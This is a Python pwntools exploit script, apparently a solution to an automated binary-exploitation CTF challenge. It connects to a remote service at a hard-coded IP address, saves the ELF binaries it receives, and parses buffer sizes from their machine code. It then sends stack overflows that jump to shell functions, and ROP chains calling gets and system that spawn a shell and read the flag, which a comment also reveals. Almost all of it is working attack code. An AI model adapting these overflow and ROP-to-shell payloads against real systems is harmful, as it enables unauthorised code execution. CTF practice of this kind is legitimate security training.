#!/usr/bin/env python
from pwn import *
import base64 , re , os

# Flag is D0_u_$tiL_Lik3_B0F_?
context.arch = 'amd64'
host , port = '110.10.147.123' , 15361
y = remote( host , port )

os.system( 'rm elf*' )

y.recvuntil( 'Just 10s!\n' )

t = 0
ti = 0.1

def save_file():
    global t
    t += 1
    s = base64.b64decode( y.recvline() )
    o = open( './elf%d' % t , 'w+' )
    o.write( s )
    o.close()
    return s


for i in range( 2 ):
    s = save_file()

    e = ELF( './elf%d' % t )
    success( 'shell -> %s' % hex( e.sym.shell ) )

    l = u32( re.findall( '\xb8\0\0\0\0\xb9(....)' , s )[0] ) * 8
    if l & 8:
        l += 8
    success( 'l -> %s' % hex( l ) )

    sleep( ti )

    p = 'y' * ( l + 8 ) + p64( e.sym.shell )
    y.sendline( p )
    sleep( ti )

    y.sendline( './next' )
    print y.recvuntil('!\n')


s = save_file()
e = ELF( './elf%d' % t )
success( 'shell2 -> %s' % hex( e.sym.shell2 ) )
l = u32( re.findall( '\xb8\0\0\0\0\xb9(....)' , s )[0] ) * 8
if l & 8:
    l += 8
success( 'l -> %s' % hex( l ) )
sleep( ti )
p = 'y' * ( l + 8 ) + p64( e.sym.shell2 )
y.sendline( p )
sleep( ti )
y.sendline( './next' )
print y.recvuntil('!\n')

for i in range( 2 ):
    s = save_file()
    e = ELF( './elf%d' % t )
    rop = ROP( e )
    l = u32( re.findall( '\xb8\0\0\0\0\xb9(....)' , s )[0] ) * 8
    if l & 8:
        l += 8
    l2 = u32( re.findall( '\x48\x81\xEC(....)' , s )[0] )
    success( 'l -> %s l2 -> %s' % ( hex( l ) , hex( l2 ) ) )
    sleep( ti )
    p = flat(
        '\0' * l, 0,
        rop.find_gadget(['pop rdi'])[0],
        e.bss() + 0x20,
        e.plt['gets'],
        rop.find_gadget(['pop rdi'])[0],
        e.bss() + 0x20,
        e.plt['system'],
    )
    y.sendline( p )
    print '\n' in p
    sleep( ti )
    y.sendline( 'sh' )
    sleep( 0.3 )
    y.sendline( './next' )
    print y.recvuntil('!\n')


s = save_file()
l = u32( re.findall( '\x48\x81\xEC(....)' , s )[0] )
success( 'l -> %s' % hex( l ) )
y.sendline( 'sh' )
sleep( ti )
y.sendline( './next' )
print y.recvuntil('!\n')


# lv8
for i in range( 3 ):
    s = save_file()
    e = ELF( './elf%d' % t )
    rop = ROP( e )
    l = u32( re.findall( '\xb8\0\0\0\0\xb9(....)' , s )[0] ) * 8
    if l & 8:
        l += 8
    p = flat(
        '\0' * l, 0,
        rop.find_gadget(['pop rdi'])[0],
        e.bss() + 0x20,
        e.plt['gets'],
        rop.find_gadget(['pop rdi'])[0],
        e.bss() + 0x20,
        e.plt['system'],
    )
    y.sendline( p )
    sleep( ti )
    y.sendline( 'sh' )
    sleep( ti )
    y.sendline( './next' )
    print y.recvuntil('!\n')



# lv10
s = save_file()

e = ELF( './elf%d' % t )
rop = ROP( e )
l = u32( re.findall( '\xb8\0\0\0\0\xb9(....)' , s )[0] ) * 8
if l & 8:
    l += 8
p = flat(
    '\0' * l, 0,
    rop.find_gadget(['pop rdi'])[0],
    e.bss() + 0x20,
    e.plt['gets'],
    rop.find_gadget(['pop rdi'])[0],
    e.bss() + 0x20,
    e.plt['system'],
)
y.sendline( p )
sleep( ti )
y.sendline( 'sh' )
sleep( ti )
y.sendline( 'cat flag' )
#print y.recvuntil('!\n')
#'''

y.interactive()